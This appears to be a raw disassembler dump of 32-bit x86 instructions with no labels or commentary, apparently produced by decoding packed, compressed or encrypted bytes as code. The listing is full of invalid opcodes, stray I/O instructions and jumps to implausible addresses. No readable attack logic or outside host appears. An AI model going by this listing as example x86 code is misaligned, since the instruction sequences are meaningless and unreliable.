  40db1e:	outs   dx,DWORD PTR ds:[esi]
  40db1f:	cmp    DWORD PTR [ecx+0x8],eax
  40db22:	xor    DWORD PTR [ebp-0x3a],ebp
  40db25:	mul    DWORD PTR [ecx-0xd]
  40db28:	xchg   esp,eax
  40db29:	sti    
  40db2a:	mov    dh,0x64
  40db2c:	clc    
  40db2d:	(bad)  
  40db2e:	and    al,0xf8
  40db30:	sbb    al,BYTE PTR [eax-0x7cf5255c]
  40db36:	sbb    al,0xd8
  40db38:	add    esi,DWORD PTR [ebp+0x2b]
  40db3b:	mov    BYTE PTR [ebx],al
  40db3d:	add    BYTE PTR [ecx],dh
  40db3f:	lock test al,0xc8
  40db42:	jae    0x40db2b
  40db44:	add    cl,BYTE PTR [ebp-0x4c480c00]
  40db4a:	(bad)  
  40db4b:	cld    
  40db4c:	neg    DWORD PTR [edx]
  40db4e:	push   cs
  40db4f:	mov    esp,0x618b0aa2
  40db54:	mov    BYTE PTR [esi],cl
  40db56:	add    BYTE PTR [ecx],dh
  40db58:	lock or DWORD PTR [ebp+0x29],esi
  40db5c:	cwde   
  40db5d:	dec    eax
  40db5e:	mov    cs,WORD PTR [esi-0x7e]
  40db61:	iret   
  40db62:	inc    esp
  40db63:	cmp    eax,0x46e90004
  40db68:	out    dx,eax
  40db69:	add    al,BYTE PTR [eax]
  40db6b:	mov    dl,0xec
  40db6d:	push   es
  40db6e:	push   es
  40db6f:	mov    ds:0x29457906,eax
  40db74:	ret    
  40db75:	or     DWORD PTR [ebp+0x29],esi
  40db78:	dec    edx
  40db79:	daa    
  40db7a:	mov    WORD PTR [esi],ss
  40db7c:	dec    eax
  40db7d:	jns    0x40dbc4
  40db7f:	or     DWORD PTR [ebx+0x4a397509],esp
  40db85:	into   
  40db86:	stc    
  40db87:	(bad)  
  40db88:	das    
  40db89:	jns    0x40dbd0
  40db8b:	stc    
  40db8c:	or     DWORD PTR [ecx+0x1111640a],edi
  40db92:	(bad)  
  40db94:	add    BYTE PTR [esi],dl
  40db96:	jns    0x40dc0c
  40db98:	add    DWORD PTR [ecx+0x11115c0a],edi
  40db9e:	aaa    
  40db9f:	retf   0xfe00
  40dba2:	jl     0x40dc10
  40dba4:	stc    
  40dba5:	arpl   cx,ax
  40dba7:	(bad)  
  40dba8:	pop    ecx
  40dba9:	out    dx,al
  40dbaa:	nop
  40dbab:	add    BYTE PTR [esi],ch
  40dbad:	icebp  
  40dbae:	lods   al,BYTE PTR ds:[esi]
  40dbaf:	push   cs
  40dbb0:	scas   al,BYTE PTR es:[edi]
  40dbb1:	add    BYTE PTR [eax-0x40],dh
  40dbb4:	call   0x5400:0x10c2b8e
  40dbbb:	cld    
  40dbbc:	mov    ?,WORD PTR [esi-0x6d71f53f]
  40dbc2:	and    ebx,DWORD PTR [edx+esi*4]
  40dbc5:	jle    0x40db80
  40dbc7:	add    eax,DWORD PTR ds:0x8a886a7c
  40dbcd:	or     DWORD PTR ds:0x917eb399,ebx
  40dbd3:	add    ebx,ebp
  40dbd5:	addr16 push 0xffffff88
  40dbd8:	or     WORD PTR ds:0x247bcea5,dx
  40dbdf:	lds    ecx,FWORD PTR [esi-0x1]
  40dbe2:	repz adc ebx,DWORD PTR [ecx+0x4a]
  40dbe6:	test   DWORD PTR [ebx],0x90a91431
  40dbec:	adc    al,0x71
  40dbee:	retf   
  40dbef:	test   al,0x71
  40dbf1:	or     DWORD PTR [esi-0x70],ebx
  40dbf4:	push   ss
  40dbf5:	icebp  
  40dbf6:	sbb    BYTE PTR [edx+0x43e2001e],cl
  40dbfc:	pushf  
  40dbfd:	push   cs
  40dbfe:	rcr    DWORD PTR [ebp+0xae94a6d],1
  40dc04:	jl     0x40dbff
  40dc06:	inc    DWORD PTR [eax+0xb]
  40dc09:	jle    0x40dc0b
  40dc0b:	jmp    0xd7b49c07
  40dc10:	add    dl,cl
  40dc12:	(bad)  
  40dc13:	dec    BYTE PTR [esi]
  40dc15:	js     0x40dc17
  40dc17:	jne    0x40dbfe
  40dc19:	cmp    dl,BYTE PTR [esi+ecx*4+0xe]
  40dc1d:	sub    eax,DWORD PTR [eax]
  40dc1f:	jne    0x40dc1a
  40dc21:	cmp    BYTE PTR [esi+0xc],dh
  40dc24:	adc    DWORD PTR [edi+ecx*4-0x2],ecx
  40dc28:	imul   BYTE PTR [eax]
  40dc2a:	jbe    0x40dc18
  40dc2c:	out    dx,al
  40dc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc2e:	adc    ebp,eax
  40dc30:	jle    0x40dc5d
  40dc32:	add    bh,bh
  40dc34:	fidiv  WORD PTR [esi-0x66a30119]
  40dc3a:	out    0x8b,eax
  40dc3c:	pop    edi
  40dc3d:	sub    BYTE PTR [eax],al
  40dc3f:	(bad)  
  40dc40:	cmp    al,0x25
  40dc42:	icebp  
  40dc43:	jo     0x40dc9d
  40dc45:	cmp    BYTE PTR [eax],al
  40dc47:	(bad)  
  40dc48:	cmp    al,0x19
  40dc4a:	icebp  
  40dc4b:	push   0xff002858
  40dc50:	sbb    al,0x4d
  40dc52:	icebp  
  40dc53:	pusha  
  40dc54:	js     0x40dc8e
  40dc56:	add    BYTE PTR [esi+0x6a],cl
  40dc59:	mov    dh,0xf7
  40dc5b:	call   DWORD PTR [edx*2-0x300909ee]
  40dc62:	idiv   ebp
  40dc64:	jle    0x40dc9e
  40dc66:	xchg   esp,eax
  40dc67:	inc    esp
  40dc68:	jno    0x40dbf5
  40dc6a:	rol    cl,1
  40dc6c:	loope  0x40dca0
  40dc6e:	push   esi
  40dc6f:	mov    edx,DWORD PTR [ebp-0x4c]
  40dc72:	vdivsd xmm0,xmm0,QWORD PTR [eax]
  40dc76:	mov    dh,0x12
  40dc78:	call   0xff3f4772
  40dc7d:	loop   0x40dcf1
  40dc7f:	je     0x40dcb0
  40dc81:	add    BYTE PTR [ebp+0x6050fabe],al
  40dc87:	or     BYTE PTR [eax+0x751047ff],0xfc
  40dc8e:	inc    edi
  40dc8f:	mov    cs,WORD PTR [edx]
  40dc91:	call   0x405bf1
  40dc96:	jecxz  0x40dce2
  40dc98:	je     0x40dca9
  40dc9a:	inc    edi
  40dc9b:	mov    es,WORD PTR [esi]
  40dc9d:	(bad)  
  40dc9e:	mov    ebp,0x3587e806
  40dca3:	adc    bh,bh
  40dca5:	or     ebx,DWORD PTR [eax]
  40dca7:	mov    ?,esi
  40dca9:	(bad)  
  40dcaa:	cmp    eax,0x5088e806
  40dcaf:	adc    bh,bh
  40dcb1:	leave  
  40dcb2:	fiadd  DWORD PTR [edx]
  40dcb4:	call   DWORD PTR [ebx+eiz*1+0x16]
  40dcb8:	add    esp,0xffff10bc
  40dcbe:	iret   
  40dcbf:	jg     0x40dc79
  40dcc1:	(bad)  
  40dcc2:	ja     0x40dcd5
  40dcc4:	add    BYTE PTR [eax],al
  40dcc6:	cwde   
  40dcc7:	or     cl,BYTE PTR [ebx-0x41026bbb]
  40dccd:	je     0x40dc5c
  40dccf:	mov    dh,BYTE PTR [edi]
  40dcd1:	add    BYTE PTR [ebp-0x2],cl
  40dcd4:	out    0x51,eax
  40dcd6:	pop    ecx
  40dcd7:	or     al,BYTE PTR [eax]
  40dcd9:	inc    DWORD PTR [eax]
  40dcdb:	cmp    eax,0xc429e701
  40dce0:	adc    bh,bh
  40dce2:	or     ebx,DWORD PTR [eax-0x6197f271]
  40dce8:	sar    DWORD PTR [edi],0x0
  40dceb:	(bad)  
  40dcec:	mov    cs,WORD PTR [edx]
  40dcee:	call   0x405622
  40dcf3:	xor    edi,0x66
  40dcf6:	fcmovnbe st,st(7)
  40dcf8:	retf   0xfefe
  40dcfb:	xor    ebp,ebx
  40dcfd:	mul    bh
  40dcff:	jns    0x40dd75
  40dd01:	or     bh,bh
  40dd03:	mov    eax,0x6fe4b6c
  40dd08:	aas    
  40dd09:	fwait
  40dd0a:	cmp    eax,0x8d02f030
  40dd0f:	lods   al,BYTE PTR ds:[esi]
  40dd10:	xor    DWORD PTR [ecx],ecx
  40dd12:	(bad)  
  40dd13:	out    dx,al
  40dd14:	mov    edi,0x1ec1d01a
  40dd19:	or     BYTE PTR [ebp-0xf6ce4c],cl
  40dd1f:	(bad)  
  40dd20:	mov    edi,0x589b507
  40dd25:	or     bh,bh
  40dd27:	fyl2x  
  40dd29:	xchg   bh,bh
  40dd2b:	mov    esi,0xb7bc7e68
  40dd30:	out    dx,al
  40dd31:	push   es
  40dd32:	inc    eax
  40dd33:	ds ins BYTE PTR es:[edi],dx
  40dd35:	adc    eax,DWORD PTR [eax]
  40dd37:	xor    eax,esi
  40dd39:	ja     0x40dcd0
  40dd3b:	jae    0x40dd12
  40dd3d:	push   es
  40dd3e:	inc    DWORD PTR [eax]
  40dd40:	sahf   
  40dd41:	icebp  
  40dd42:	repnz dec DWORD PTR [esi-0x4b837111]
  40dd49:	xor    eax,ebx
  40dd4b:	dec    edi
  40dd4c:	or     DWORD PTR [ecx-0x37cebf4a],esp
  40dd52:	es jnp 0x40dd86
  40dd55:	lock stc 
  40dd57:	mov    edi,0xa91be4dc
  40dd5c:	xor    eax,esi
  40dd5e:	add    cl,BYTE PTR [ebp-0xfa4e44]
  40dd64:	dec    esi
  40dd65:	je     0x40dd29
  40dd67:	sub    esp,ecx
  40dd69:	pop    ss
  40dd6a:	xor    ecx,DWORD PTR [edi-0x10]
  40dd6d:	out    dx,eax
  40dd6e:	sbb    al,dl
  40dd70:	mov    edx,0xf10b02ef
  40dd75:	or     esp,ebx
  40dd77:	add    BYTE PTR [eax],bl
  40dd79:	mov    gs,eax
  40dd7b:	add    esi,DWORD PTR [ecx]
  40dd7d:	cld    
  40dd7e:	fcomi  st,st(7)
  40dd80:	push   cs
  40dd81:	xchg   ebx,eax
  40dd82:	jno    0x40dd8b
  40dd84:	push   cs
  40dd85:	adc    DWORD PTR [ecx],ebp
  40dd87:	xchg   ecx,eax
  40dd88:	aaa    
  40dd89:	jno    0x40dde6
  40dd8b:	mov    esp,0x91360971
  40dd90:	sub    dh,cl
  40dd92:	and    eax,0x11fcee73
  40dd97:	cli    
  40dd98:	pop    eax
  40dd99:	or     DWORD PTR [esi],ebx
  40dd9b:	xchg   ecx,eax
  40dd9c:	sub    dh,cl
  40dd9e:	push   ecx
  40dd9f:	jae    0x40dd77
  40dda1:	cld    
  40dda2:	pop    ebx
  40dda3:	jno    0x40dda5
  40dda5:	repz sti 
  40dda7:	add    eax,0xcd57b407
  40ddac:	mov    cl,0x6e
  40ddae:	icebp  
  40ddaf:	cmc    
  40ddb0:	jb     0x40dd68
  40ddb2:	cld    
  40ddb3:	cwde   
  40ddb4:	push   es
  40ddb5:	and    al,0x19
  40ddb7:	cmp    DWORD PTR [edi],eax
  40ddb9:	sbb    al,0x11
  40ddbb:	ror    DWORD PTR [ecx],1
  40ddbd:	lahf   
  40ddbe:	cld    
  40ddbf:	aad    0x1b
  40ddc1:	fwait
  40ddc2:	mov    ebp,cs
  40ddc4:	push   es
  40ddc5:	call   0x6392:0x5ac17448
  40ddcc:	dec    edi
  40ddcd:	jg     0x40ddcb
  40ddcf:	mov    ch,0x6
  40ddd1:	cld    
  40ddd2:	sbb    BYTE PTR [esi-0x5a045ab0],ch
  40ddd8:	push   es
  40ddd9:	pop    ecx
  40ddda:	push   esi
  40dddb:	sbb    eax,0xa9103104
  40dde0:	(bad)  
  40dde1:	push   cs
  40dde2:	jno    0x40de5f
  40dde4:	mov    ebx,0x908608f1
  40dde9:	cmp    dh,cl
  40ddeb:	or     eax,0xfffc3e73
  40ddf0:	jne    0x40ddd3
  40ddf2:	mov    ah,0xfd
  40ddf4:	outs   dx,BYTE PTR ds:[esi]
  40ddf5:	aaa    
  40ddf6:	pop    ecx
  40ddf7:	call   0xff3d819a
  40ddfc:	mov    ecx,0xe174fae2
  40de01:	cmp    bh,BYTE PTR [ecx-0x2]
  40de04:	dec    esi
  40de05:	aaa    
  40de06:	icebp  
  40de07:	mov    ah,0x76
  40de09:	add    BYTE PTR [edi],ch
  40de0b:	cld    
  40de0c:	mov    WORD PTR [eax+esi*2-0x5],fs
  40de10:	(bad)  
  40de11:	ss ret 0xb4fa
  40de15:	ins    DWORD PTR es:[edi],dx
  40de16:	xor    al,0xfc
  40de18:	(bad)  
  40de19:	adc    ebp,ecx
  40de1b:	jle    0x40de1d
  40de1d:	jmp    0x6c4fa6d3
  40de22:	retf   0xfefa
  40de25:	push   cs
  40de26:	aaa    
  40de27:	mov    dh,0xbb
  40de29:	pop    es
  40de2a:	das    
  40de2b:	cld    
  40de2c:	out    0xd5,eax
  40de2e:	stos   DWORD PTR es:[edi],eax
  40de2f:	sti    
  40de30:	(bad)  
  40de31:	mul    BYTE PTR [esi-0x3f]
  40de34:	std    
  40de35:	out    dx,al
  40de36:	xor    al,0xf1
  40de38:	test   BYTE PTR [esi+0x2c],dh
  40de3b:	cld    
  40de3c:	enter  0x99ab,0xfb
  40de40:	push   ebx
  40de41:	bound  edi,QWORD PTR [ecx]
  40de43:	mov    al,bl
  40de45:	cdq    
  40de46:	aaa    
  40de47:	cld    
  40de48:	(bad)  
  40de49:	scas   al,BYTE PTR es:[edi]
  40de4a:	push   es
  40de4b:	sar    ebp,0xbe
  40de4e:	xor    al,0x9
  40de50:	add    cl,ch
  40de52:	xor    dl,BYTE PTR [eax-0x449622bc]
  40de58:	jae    0x40de46
  40de5a:	mov    dl,0x40
  40de5c:	add    BYTE PTR [esi+ebx*2],dl
  40de5f:	lock or al,ch
  40de62:	xor    cl,BYTE PTR [ecx]
  40de64:	push   0x4884b7
  40de69:	add    BYTE PTR [edi+0xe80a8b],ch
  40de6f:	scas   eax,DWORD PTR es:[edi]
  40de70:	jbe    0x40de71
  40de72:	call   ecx
  40de74:	jnp    0x40de2e
  40de76:	(bad)  
  40de77:	lahf   
  40de78:	add    al,0x68
  40de7a:	sbb    DWORD PTR ds:[edi],eax
  40de7d:	add    BYTE PTR [ebp-0x1b86b],cl
  40de83:	jg     0x40de3a
  40de85:	out    0x67,al
  40de87:	outs   dx,DWORD PTR ds:[esi]
  40de88:	add    al,0xff
  40de8a:	lea    edx,[ebp+0x3ffffe47]
  40de90:	mov    ch,0xfd
  40de92:	mov    ch,0x80
  40de94:	add    edi,edi
  40de96:	push   DWORD PTR [eax+0x6e]
  40de99:	jp     0x40de9b
  40de9b:	fdivr  DWORD PTR [edi-0x7b]
  40de9e:	mov    esp,0x40ff043e
  40dea3:	iret   
  40dea4:	jp     0x40de6c
  40dea6:	add    al,bl
  40dea8:	push   es
  40dea9:	lea    edx,[ebp-0xfce6]
  40deaf:	(bad)  
  40deb0:	or     BYTE PTR [eax],dl
  40deb2:	add    al,cl
  40deb4:	push   es
  40deb5:	je     0x40e3ca
  40debb:	sbb    eax,0x7ffec26b
  40dec0:	add    eax,0xb52c428d
  40dec5:	shr    WORD PTR [edi],1
  40dec8:	(bad)  
  40dec9:	(bad)  
  40deca:	out    0xdc,eax
  40decc:	mov    ?,esi
  40dece:	inc    DWORD PTR [ebx+0x27546]
  40ded4:	jae    0x40de61
  40ded6:	mov    edx,DWORD PTR [ebp-0xfb66]
  40dedc:	ffree  st(7)
  40dede:	sub    dl,BYTE PTR [eax+0x40]
  40dee1:	cmp    BYTE PTR [edi+0x41],cl
  40dee4:	xor    eax,esi
  40dee6:	sbb    dl,BYTE PTR [edx-0x35]
  40dee9:	out    dx,eax
  40deea:	add    cl,BYTE PTR [ebx]
  40deec:	jno    0x40deeb
  40deee:	add    bl,ch
  40def0:	fisubr DWORD PTR [esi+ebp*2-0x3e]
  40def4:	aaa    
  40def5:	jae    0x40defb
  40def7:	lea    esi,[ebx-0x44]
  40defa:	jns    0x40de81
  40defc:	frstor [ecx+0x4]
  40deff:	dec    DWORD PTR [ecx+0x3140bb7e]
  40df05:	push   ebx
  40df06:	mov    cs,WORD PTR [ebx]
  40df08:	sbb    DWORD PTR [ebx+0x4306ff70],esi
  40df0e:	dec    esi
  40df0f:	mov    ah,0xff
  40df11:	cmp    al,BYTE PTR [eax+edx*2]
  40df14:	or     DWORD PTR [ebx+0x71],edx
  40df17:	(bad)  
  40df18:	out    dx,al
  40df19:	push   0x22e7b07e
  40df1e:	add    al,0x50
  40df20:	dec    ecx
  40df21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df23:	inc    eax
  40df24:	xor    DWORD PTR [ebx],edx
  40df26:	dec    esi
  40df27:	mov    al,0xcf
  40df29:	or     al,BYTE PTR [eax+ebp*8]
  40df2c:	cmp    BYTE PTR [edi+0x302a0002],al
  40df32:	(bad)  
  40df33:	adc    cl,BYTE PTR [ecx+0x70]
  40df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df37:	inc    eax
  40df38:	add    BYTE PTR [ecx],dh
  40df3a:	jmp    0x40df88
  40df3c:	mov    al,0xa7
  40df3e:	loop   0x40df42
  40df40:	jmp    DWORD PTR [eax+edi*8]
  40df43:	jmp    0x8e8:0x2d29478
  40df4a:	pop    edx
  40df4b:	add    edi,edi
  40df4d:	mov    ah,0x6c
  40df4f:	(bad)  
  40df50:	std    
  40df51:	jle    0x40df0d
  40df53:	push   ebx
  40df54:	(bad)  
  40df55:	mov    esp,0x6eff0273
  40df5a:	(bad)  
  40df5b:	call   0xe94a10d8
  40df60:	mov    BYTE PTR [esi+0x56496409],bl
  40df66:	stc    
  40df67:	xchg   ebp,eax
  40df68:	add    eax,DWORD PTR [esp+edi*4-0xfb9fc72]
  40df6f:	mov    al,ds:0x7e09317d
  40df74:	mov    ecx,0x375fa7e
  40df79:	sbb    DWORD PTR [ebx+0x5f],eax
  40df7c:	add    esp,DWORD PTR [esi]
  40df7e:	ret    
  40df7f:	sub    cl,BYTE PTR [ecx+esi*1]
  40df82:	pop    esi
  40df83:	jb     0x40df75
  40df85:	pop    ss
  40df86:	jg     0x40df6d
  40df88:	jmp    0x40df2a
  40df8a:	fwait
  40df8b:	dec    ebp
  40df8c:	add    edi,DWORD PTR [edx]
  40df8e:	leave  
  40df8f:	mov    esp,0x3e596112
  40df94:	jns    0x40dfbf
  40df96:	loope  0x40df19
  40df98:	add    ch,dh
  40df9a:	clc    
  40df9b:	inc    eax
  40df9c:	sub    eax,DWORD PTR [eax]
  40df9e:	mov    bh,0xf8
  40dfa0:	and    eax,0xe901f0cd
  40dfa5:	pop    eax
  40dfa6:	stos   BYTE PTR es:[edi],al
  40dfa7:	in     eax,0x69
  40dfa9:	enter  0x63ca,0xe9
  40dfad:	ins    DWORD PTR es:[edi],dx
  40dfae:	adc    al,bh
  40dfb0:	jnp    0x40dfbd
  40dfb2:	leave  
  40dfb3:	inc    edx
  40dfb4:	jb     0x40dfb9
  40dfb6:	mov    dh,0x82
  40dfb8:	stos   DWORD PTR es:[edi],eax
  40dfb9:	call   FWORD PTR [eax]
  40dfbb:	adc    ebp,esi
  40dfbd:	js     0x40dff8
  40dfbf:	loope  0x40df66
  40dfc1:	add    bl,BYTE PTR [esi-0x69d8ad08]
  40dfc7:	jle    0x40dfaa
  40dfc9:	jmp    0x40df90
  40dfcb:	clc    
  40dfcc:	int    0x2
  40dfce:	sbb    edx,DWORD PTR ds:0xe12978c6
  40dfd4:	xchg   ecx,eax
  40dfd5:	add    dh,BYTE PTR [esi-0x8]
  40dfd8:	inc    DWORD PTR [edx+0x35]
  40dfdb:	popa   
  40dfdc:	mov    ds:0x6808ec0c,al
  40dfe1:	jae    0x40dfb4
  40dfe3:	dec    ecx
  40dfe4:	add    BYTE PTR [esi+0x2847bf19],bl
  40dfea:	xor    eax,0x3379f0e1
  40dfef:	clc    
  40dff0:	or     ch,BYTE PTR [ecx+0x11501cc6]
  40dff6:	lods   eax,DWORD PTR ds:[esi]
  40dff7:	push   ebp
  40dff8:	inc    ecx
  40dff9:	jmp    0xe1b5d880
  40dffe:	sbb    cl,cl
  40e000:	sti    
  40e001:	data16 add BYTE PTR [ebx],dh
  40e004:	loope  0x40dfc6
  40e006:	ins    BYTE PTR es:[edi],dx
  40e007:	xor    edi,eax
  40e009:	imul   ebp,ecx,0xa85cbb9a
  40e00f:	xor    ah,BYTE PTR [ecx-0x76]
  40e012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e013:	jne    0x40e01e
  40e015:	push   esp
  40e017:	mov    eax,0xdae9414f
  40e01c:	leave  
  40e01d:	(bad)  
  40e01e:	xor    eax,DWORD PTR cs:[eax+eax*8]
  40e022:	popf   
  40e023:	inc    esi
  40e024:	pop    ecx
  40e025:	push   0x4a5169
  40e02a:	mov    ecx,0x1087e33
  40e02f:	pushf  
  40e030:	repz inc BYTE PTR [esi]
  40e033:	retf   0x8c99
  40e036:	(bad)  
  40e037:	xor    BYTE PTR [ebx+0x0],ah
  40e03a:	xor    DWORD PTR [edx],0x61
  40e03d:	les    ecx,FWORD PTR [ebp+ebp*8+0x32e96808]
  40e044:	or     DWORD PTR [eax-0x178472f],eax
  40e04a:	(bad)  
  40e04b:	cmp    al,0xc9
  40e04d:	jae    0x40e054
  40e04f:	fstp   QWORD PTR [eax-0x18]
  40e052:	add    BYTE PTR [esi-0x6e],cl
  40e055:	std    
  40e056:	inc    DWORD PTR [ebx+0x481472cb]
  40e05c:	sbb    BYTE PTR gs:[ebp+0x19],0xd
  40e061:	push   eax
  40e062:	(bad)  
  40e063:	cmp    eax,0x5ce805
  40e068:	mov    ah,0x9
  40e06a:	(bad)  
  40e06b:	call   0x3e6874
  40e070:	mov    al,0x51
  40e072:	(bad)  
  40e073:	push   DWORD PTR [edi-0x48038af7]
  40e079:	jg     0x40e083
  40e07b:	call   0x3e6852
  40e080:	ror    edi,1
  40e082:	add    al,BYTE PTR [eax]
  40e084:	fld    QWORD PTR [ebp-0x6b37e16]
  40e08a:	cmc    
  40e08b:	jmp    DWORD PTR [edi-0x7a]
  40e08e:	inc    ebx
  40e08f:	cld    
  40e090:	enter  0x7509,0x10
  40e094:	ja     0x40e114
  40e096:	or     al,0xe8
  40e098:	jmp    0xdca:0xd3000073
  40e09f:	test   DWORD PTR [ebx],edx
  40e0a1:	or     eax,0x4e0f0000
  40e0a6:	clc    
  40e0a7:	add    al,cl
  40e0a9:	or     al,BYTE PTR [eax]
  40e0ab:	(bad)  
  40e0ac:	popf   
  40e0ad:	(bad)  
  40e0ae:	std    
  40e0af:	pop    es
  40e0b0:	fmul   DWORD PTR [edx]
  40e0b2:	push   0x0
  40e0b4:	mov    ds:0xa2006a0a,al
  40e0b9:	or     cl,BYTE PTR [ebp-0x72a553bb]
  40e0bf:	test   DWORD PTR [ecx+esi*8+0x858fffd],ebx
  40e0c6:	jne    0x40e0c0
  40e0c8:	ja     0x40e149
  40e0ca:	cld    
  40e0cb:	call   0x7b5511d0
  40e0d0:	add    BYTE PTR [ecx],dh
  40e0d2:	jmp    0x40e096
  40e0d4:	jae    0x40e10a
  40e0d6:	fst    DWORD PTR [eax+0x6ae076ff]
  40e0dc:	xchg   edx,eax
  40e0dd:	stc    
  40e0de:	and    BYTE PTR [edi+edi*8],al
  40e0e1:	fmul   st(7),st
  40e0e3:	jmp    0xaa4f:0xffafc184
  40e0ea:	mov    al,0x8d
  40e0ec:	test   BYTE PTR [ebp-0x69],al
  40e0ef:	(bad)  
  40e0f0:	(bad)  
  40e0f1:	loope  0x40e124
  40e0f3:	in     al,dx
  40e0f4:	je     0x40e097
  40e0f6:	(bad)  
  40e0f7:	dec    DWORD PTR [eax-0x1078f54]
  40e0fd:	cs mov bl,cl
  40e100:	mov    esp,DWORD PTR [esi]
  40e102:	ins    DWORD PTR es:[di],dx
  40e104:	add    BYTE PTR [ecx+0x314160fa],cl
  40e10a:	push   edi
  40e10b:	mov    dh,0xef
  40e10d:	push   es
  40e10e:	pop    edi
  40e10f:	add    bh,bh
  40e111:	jl     0x40e0e7
  40e113:	jmp    0xac89:0x4eaecd
  40e11a:	inc    ebx
  40e11b:	clc    
  40e11c:	(bad)  
  40e11d:	out    dx,al
  40e11e:	bound  edi,QWORD PTR [esi+0x26deeb]
  40e124:	add    BYTE PTR [ebp-0xd],ah
  40e127:	push   0x1
  40e129:	xor    DWORD PTR [edi],eax
  40e12b:	sar    esi,0x84
  40e12e:	or     edi,eax
  40e130:	inc    BYTE PTR [eax]
  40e132:	mov    BYTE PTR [esi],0x76
  40e135:	or     cl,cl
  40e137:	xchg   DWORD PTR [esi+edi*8-0x144b094a],esi
  40e13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13f:	(bad)  
  40e140:	(bad)  
  40e141:	out    0xb8,eax
  40e143:	push   ebx
  40e144:	add    bh,bh
  40e146:	sahf   
  40e147:	or     BYTE PTR [esp+esi*8-0x220a61],bl
  40e14e:	add    eax,0x3979d605
  40e153:	loope  0x40e16d
  40e155:	(bad)  
  40e156:	jg     0x40e14d
  40e158:	lds    edi,FWORD PTR [ecx-0x42027a]
  40e15e:	push   esi
  40e15f:	arpl   WORD PTR [ebp-0x1],sp
  40e162:	addr16 cmc 
  40e164:	and    edi,esp
  40e166:	dec    ecx
  40e167:	dec    esp
  40e168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e169:	call   DWORD PTR [edi-0xb]
  40e16c:	adc    eax,DWORD PTR [eax]
  40e16e:	pop    ecx
  40e16f:	jg     0x40e181
  40e171:	add    al,0x31
  40e173:	shr    BYTE PTR [edx+0x725c3110],0xf0
  40e17a:	mov    cl,0xcc
  40e17c:	nop
  40e17d:	imul   DWORD PTR [edi]
  40e17f:	cmc    
  40e180:	arpl   WORD PTR [ecx+0x25],cx
  40e183:	pop    edx
  40e184:	outs   dx,BYTE PTR ds:[esi]
  40e185:	jns    0x40e1c8
  40e187:	hlt    
  40e188:	fisttp DWORD PTR [edi]
  40e18a:	or     DWORD PTR [ecx-0x1f],edi
  40e18d:	add    esi,DWORD PTR [ecx]
  40e18f:	add    BYTE PTR [ecx],ch
  40e191:	shrd   DWORD PTR [ebx],edx,0xe8
  40e195:	add    eax,DWORD PTR [eax]
  40e197:	xor    esp,ecx
  40e199:	stos   DWORD PTR es:[edi],eax
  40e19a:	sti    
  40e19b:	div    ah
  40e19d:	call   0x3d8fd7a5
  40e1a2:	jmp    FWORD PTR [edi]
  40e1a4:	or     ecx,ebp
  40e1a6:	imul   esi,DWORD PTR [ecx],0x3169e95f
  40e1ac:	pop    edi
  40e1ad:	jmp    0xb93e5742
  40e1b2:	nop
  40e1b3:	lods   eax,DWORD PTR ds:[esi]
  40e1b4:	std    
  40e1b5:	adc    eax,0x659bfff
  40e1ba:	jns    0x40e175
  40e1bc:	hlt    
  40e1bd:	jae    0x40e1be
  40e1bf:	xchg   esi,eax
  40e1c0:	dec    esi
  40e1c1:	add    BYTE PTR [ecx+0x32],dh
  40e1c4:	or     DWORD PTR [ebx],ecx
  40e1c6:	sub    DWORD PTR [ecx],ebx
  40e1c8:	push   cs
  40e1c9:	jmp    0x4a1496
  40e1ce:	push   ecx
  40e1cf:	mov    ds:0x87e9414c,eax
  40e1d4:	jge    0x40e1e6
  40e1d6:	shl    DWORD PTR [ebx+eax*4+0x7fe2c6fe],0xcf
  40e1de:	ins    BYTE PTR es:[edi],dx
  40e1df:	mov    ecx,0x67b6f6f8
  40e1e4:	inc    esp
  40e1e5:	push   edx
  40e1e6:	shl    DWORD PTR [ebx+eax*4-0x725a5902],0xef
  40e1ee:	xchg   esi,eax
  40e1ef:	dec    edi
  40e1f0:	repz out 0xb5,eax
  40e1f3:	mov    ebx,0x3503fef3
  40e1f8:	pop    edi
  40e1f9:	add    BYTE PTR [esi-0x91b8700],al
  40e1ff:	jle    0x40e230
  40e201:	repz je 0x40e1e9
  40e204:	sbb    ch,dl
  40e206:	lea    ebp,[esi+0x1f]
  40e209:	add    DWORD PTR [ebp+edx*2+0x5efef31f],0x56f6dfc9
  40e214:	pop    es
  40e215:	in     al,dx
  40e216:	mov    dh,BYTE PTR [edi+edi*8-0xe]
  40e21a:	or     ch,BYTE PTR [ecx]
  40e21c:	jle    0x40e286
  40e21e:	push   eax
  40e21f:	jo     0x40e1da
  40e221:	jmp    0x40e219
  40e223:	ss out 0xf2,eax
  40e226:	mov    ah,0x41
  40e228:	out    0xf2,eax
  40e22a:	(bad)  
  40e22b:	adc    edx,ebp
  40e22d:	cmp    esi,0x1e
  40e230:	cmp    ecx,ecx
  40e232:	jae    0x40e1d5
  40e234:	pop    edx
  40e235:	pop    es
  40e236:	add    dh,bh
  40e238:	jge    0x40e2a5
  40e23a:	mov    es,WORD PTR [eax]
  40e23c:	mov    cs,WORD PTR [eax+eax*1-0x1]
  40e240:	gs loopne 0x40e238
  40e243:	call   FWORD PTR [edi+0x300873f5]
  40e249:	jne    0x40e1ff
  40e24b:	dec    DWORD PTR [edi+0x7f000264]
  40e251:	mov    dl,0x66
  40e253:	sahf   
  40e254:	ds dec eax
  40e256:	add    bh,bh
  40e258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e259:	in     al,0xf5
  40e25b:	jmp    FWORD PTR [edi-0xb]
  40e25e:	jae    0x40e268
  40e260:	add    BYTE PTR [eax-0x60004b99],al
  40e266:	add    BYTE PTR fs:[eax],al
  40e269:	lahf   
  40e26a:	mov    dl,0x66
  40e26c:	loop   0x40e25b
  40e26e:	inc    edi
  40e26f:	add    bh,bh
  40e271:	in     eax,0xe4
  40e273:	cmc    
  40e274:	call   FWORD PTR [edi-0x4ff78c0b]
  40e27a:	aas    
  40e27b:	mov    ah,0xff
  40e27d:	scas   eax,DWORD PTR es:[edi]
  40e27e:	in     al,0x50
  40e280:	mov    ebp,DWORD PTR [edi-0x534a020c]
  40e286:	cld    
  40e287:	std    
